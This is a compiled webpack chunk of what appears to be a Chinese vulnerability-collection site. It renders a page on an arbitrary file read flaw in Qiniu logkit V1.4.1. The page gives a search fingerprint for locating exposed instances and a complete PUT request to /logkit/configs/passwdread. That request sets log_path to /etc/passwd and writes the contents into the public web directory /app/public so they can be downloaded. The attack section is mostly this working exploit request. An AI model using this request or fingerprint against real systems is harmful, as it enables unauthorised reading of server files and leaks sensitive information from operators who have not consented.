(window.webpackJsonp=window.webpackJsonp||[]).push([[119],{2144:function(t,s,a){t.exports=a.p+"assets/img/1650509317464-3b428310-57b3-4323-86b8-3bc96270dc91.559babbc.png"},2145:function(t,s,a){t.exports=a.p+"assets/img/1650509841938-35e81793-6098-43ee-815d-311b45da7575.1314b030.png"},2146:function(t,s,a){t.exports=a.p+"assets/img/1650509983538-d5d3c3ef-8961-420a-b6e7-a7b2d526e585.b6348c35.png"},2147:function(t,s,a){t.exports=a.p+"assets/img/1650509901001-6b9e9d97-8540-40cb-84f8-4b30523e1491.571383dd.png"},2852:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"七牛云-logkit-log-path-任意文件读取漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#七牛云-logkit-log-path-任意文件读取漏洞"}},[t._v("#")]),t._v(" 七牛云 logkit log_path 任意文件读取漏洞")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("七牛云 logkit log_path 参数可自定义读取服务器文件，配合读取的文件写入Web目录将会使攻击者读取到服务器任意文件，造成服务器敏感信息泄漏")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("七牛云 logkit V1.4.1")]),n("br"),t._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v('title="七牛Logkit配置文件助手"')]),n("br"),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("主页面")]),t._v(" "),n("p",[n("img",{attrs:{src:a(2144),alt:"img"}})]),t._v(" "),n("p",[t._v("发送请求包配置读取文件")]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("PUT")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("logkit"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("configs"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("passwdread "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nAccept"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\nAccept"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" deflate\nAccept"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Language"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" zh"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("CN")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("zh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.9")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("en"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("US")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.8")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("en"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.7")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("zh"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("TW")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.6")]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("356")]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("json\nUser"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Mozilla"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("5.0")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Macintosh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Intel Mac "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("OS")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("X")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("10_15_7")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" AppleWebKit"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("537.36")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("KHTML")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" like Gecko"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" Chrome"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("100.0")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v(".4896")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v(".127")]),t._v(" Safari"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("537.36")]),t._v("\n\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"name"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"passwdread"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"batch_interval"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"collect_interval"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"reader"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"mode"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"file"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"log_path"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"/etc/passwd"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"read_from"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"oldest"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"datasource_tag"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"datasource"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"encoding"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"UTF-8"')]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"parser"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"type"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"raw"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"name"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"parser"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"timestamp"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"true"')]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"transforms"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"senders"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n      "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"sender_type"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"file"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n      "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"file_send_path"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"/app/public/passwd.log"')]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br"),n("span",{staticClass:"line-number"},[t._v("15")]),n("br"),n("span",{staticClass:"line-number"},[t._v("16")]),n("br"),n("span",{staticClass:"line-number"},[t._v("17")]),n("br"),n("span",{staticClass:"line-number"},[t._v("18")]),n("br"),n("span",{staticClass:"line-number"},[t._v("19")]),n("br"),n("span",{staticClass:"line-number"},[t._v("20")]),n("br"),n("span",{staticClass:"line-number"},[t._v("21")]),n("br"),n("span",{staticClass:"line-number"},[t._v("22")]),n("br"),n("span",{staticClass:"line-number"},[t._v("23")]),n("br"),n("span",{staticClass:"line-number"},[t._v("24")]),n("br"),n("span",{staticClass:"line-number"},[t._v("25")]),n("br"),n("span",{staticClass:"line-number"},[t._v("26")]),n("br"),n("span",{staticClass:"line-number"},[t._v("27")]),n("br"),n("span",{staticClass:"line-number"},[t._v("28")]),n("br"),n("span",{staticClass:"line-number"},[t._v("29")]),n("br"),n("span",{staticClass:"line-number"},[t._v("30")]),n("br"),n("span",{staticClass:"line-number"},[t._v("31")]),n("br"),n("span",{staticClass:"line-number"},[t._v("32")]),n("br"),n("span",{staticClass:"line-number"},[t._v("33")]),n("br")])]),n("p",[n("img",{attrs:{src:a(2145),alt:"img"}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(2146),alt:"img"}})]),t._v(" "),n("p",[t._v("请求读取的文件 /app/public 目录为Docker默认Web路径，写入可读取目标文件")]),t._v(" "),n("p",[n("img",{attrs:{src:a(2147),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);